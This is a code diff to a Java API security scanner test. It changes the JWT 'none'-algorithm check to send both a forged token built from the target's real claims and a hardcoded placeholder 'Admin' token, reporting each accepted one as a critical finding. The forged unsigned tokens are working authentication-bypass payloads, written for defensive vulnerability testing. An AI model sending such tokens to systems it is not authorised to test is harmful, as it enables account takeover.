@@ -50,10 +50,12 @@ public class BrokenAuthenticationTestCase implements TestCase {
     private static final String NONE_ALG_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0";
 
     // JWT with "none" algorithm - known attack payload. Placeholder identity ("sub":"1234567890")
-    // used only as a fallback when no real authenticated token is available to build a
-    // none-algorithm forgery from (see buildNoneAlgJwt) — an identity-aware backend that keys
-    // sessions by a real subject (email, username, ...) won't resolve this to any account, so
-    // the signature-bypass can be structurally correct while still not authenticating as anyone.
+    // always tried alongside the real-claims candidate when one is available (see
+    // buildNoneAlgJwtCandidates) — an identity-aware backend that keys sessions by a real subject
+    // (email, username, ...) won't resolve this to any account, so the signature-bypass can be
+    // structurally correct while still not authenticating as anyone. Kept in the candidate list
+    // regardless, since a different backend (demo/seed account matching this exact placeholder,
+    // or one that doesn't key sessions by subject at all) can still bypass on it.
     private static final String NONE_ALG_JWT =
             NONE_ALG_HEADER +
             ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ" + // {"sub":"1234567890","name":"Admin","iat":1516239022}
@@ -420,23 +422,26 @@ public class BrokenAuthenticationTestCase implements TestCase {
     }
 
     /**
-     * Builds a forged "none"-algorithm JWT, reusing the real configured token's own payload
-     * claims when one is available instead of a generic placeholder identity. Confirmed live
-     * against crAPI: its identity service keys sessions by the real {@code sub} (the user's
-     * email), so the hardcoded placeholder ({@code "sub":"1234567890"}) never resolves to any
-     * account — the signature-bypass is structurally correct but the response still isn't a
-     * success, producing a false negative on any backend that identifies users this way. Falls
-     * back to the placeholder for unauthenticated scans, where there's no real token to reuse.
+     * Builds every forged "none"-algorithm JWT candidate worth trying, real-claims first then
+     * the placeholder — additive, not a choice between them. Confirmed live against crAPI: its
+     * identity service keys sessions by the real {@code sub} (the user's email), so the
+     * hardcoded placeholder ({@code "sub":"1234567890"}) never resolves to any account there —
+     * the signature-bypass is structurally correct but the response still isn't a success. But a
+     * different target could be the other way around (a demo/seed account matching the
+     * placeholder subject, or no subject-based session keying at all), so both candidates are
+     * always tried when a real token is configured; only the placeholder is tried otherwise.
      */
-    private String buildNoneAlgJwt(HttpClient httpClient) {
+    private List<String> buildNoneAlgJwtCandidates(HttpClient httpClient) {
+        List<String> candidates = new ArrayList<>();
         String realToken = httpClient.getConfiguredBearerToken();
         if (realToken != null && !realToken.isBlank()) {
             String[] parts = realToken.split("\\.");
             if (parts.length >= 2) {
-                return NONE_ALG_HEADER + "." + parts[1] + ".";
+                candidates.add(NONE_ALG_HEADER + "." + parts[1] + ".");
             }
         }
-        return NONE_ALG_JWT;
+        candidates.add(NONE_ALG_JWT);
+        return candidates;
     }
 
     private List<Finding> testJwtNoneAlgorithm(EndpointInfo endpoint, HttpClient httpClient) {
@@ -468,32 +473,44 @@ public class BrokenAuthenticationTestCase implements TestCase {
                 return findings;
             }
 
-            // Step 2 — send the JWT-none token.  A 2xx response NOW means the unsigned
-            // token bypassed authentication on an endpoint that normally requires it.
-            Map<String, String> noneAlgHeaders = Map.of("Authorization", "Bearer " + buildNoneAlgJwt(httpClient));
-            HttpResponse response = switch (endpoint.getMethod().toUpperCase()) {
-                case "POST"   -> httpClient.postWithStatus(fullUrl, noneAlgHeaders, "application/json", "{}");
-                case "PUT"    -> httpClient.putWithStatus(fullUrl, noneAlgHeaders, "application/json", "{}");
-                case "DELETE" -> httpClient.deleteWithStatus(fullUrl, noneAlgHeaders);
-                default       -> httpClient.getWithStatus(fullUrl, noneAlgHeaders);
-            };
+            // Step 2 — send the JWT-none token, once per forged-identity candidate.  A 2xx
+            // response NOW means the unsigned token bypassed authentication on an endpoint that
+            // normally requires it. Try every candidate rather than stopping at the first hit —
+            // different backends can be vulnerable to different candidates (see
+            // buildNoneAlgJwtCandidates), so all bypasses found are reported, not just one. On a
+            // backend that accepts any structurally-valid none-alg token without checking claims
+            // at all, both candidates will bypass — that's correctly two findings (two distinct
+            // forged tokens each independently defeated signature validation), not a duplicate,
+            // so the title is tagged per-candidate to make that legible in the report.
+            for (String candidate : buildNoneAlgJwtCandidates(httpClient)) {
+                Map<String, String> noneAlgHeaders = Map.of("Authorization", "Bearer " + candidate);
+                HttpResponse response = switch (endpoint.getMethod().toUpperCase()) {
+                    case "POST"   -> httpClient.postWithStatus(fullUrl, noneAlgHeaders, "application/json", "{}");
+                    case "PUT"    -> httpClient.putWithStatus(fullUrl, noneAlgHeaders, "application/json", "{}");
+                    case "DELETE" -> httpClient.deleteWithStatus(fullUrl, noneAlgHeaders);
+                    default       -> httpClient.getWithStatus(fullUrl, noneAlgHeaders);
+                };
 
-            if (looksLikeAuthSuccess(response)) {
-                Finding finding = new Finding(
-                        UUID.randomUUID().toString(),
-                        "JWT 'none' Algorithm Accepted",
-                        "The API accepted a JWT token with 'none' signing algorithm, which means " +
-                        "tokens can be forged without a valid signature.",
-                        Severity.CRITICAL,
-                        getId(),
-                        endpoint.getMethod() + " " + endpoint.getPath(),
-                        "Always validate JWT signatures. Reject tokens with 'none' or 'null' algorithm. " +
-                        "Use a whitelist of accepted signing algorithms."
-                );
-                finding.setEvidence("Server returned HTTP " + response.getStatusCode() +
-                        " when presented with a JWT using 'none' algorithm (baseline without auth: HTTP " +
-                        baseline.getStatusCode() + ")");
-                findings.add(finding);
+                if (looksLikeAuthSuccess(response)) {
+                    boolean isPlaceholder = candidate.equals(NONE_ALG_JWT);
+                    String candidateLabel = isPlaceholder ? "placeholder token" : "real-claims token";
+                    Finding finding = new Finding(
+                            UUID.randomUUID().toString(),
+                            "JWT 'none' Algorithm Accepted (" + candidateLabel + ")",
+                            "The API accepted a JWT token with 'none' signing algorithm, which means " +
+                            "tokens can be forged without a valid signature.",
+                            Severity.CRITICAL,
+                            getId(),
+                            endpoint.getMethod() + " " + endpoint.getPath(),
+                            "Always validate JWT signatures. Reject tokens with 'none' or 'null' algorithm. " +
+                            "Use a whitelist of accepted signing algorithms."
+                    );
+                    finding.setEvidence("Server returned HTTP " + response.getStatusCode() +
+                            " when presented with a JWT using 'none' algorithm (baseline without auth: HTTP " +
+                            baseline.getStatusCode() + "), forged using " +
+                            (isPlaceholder ? "a placeholder identity (sub=1234567890)" : "the target's own real claims"));
+                    findings.add(finding);
+                }
             }
         } catch (Exception e) {
             logger.debug("Error testing JWT none algorithm on {}: {}", endpoint, e.getMessage());
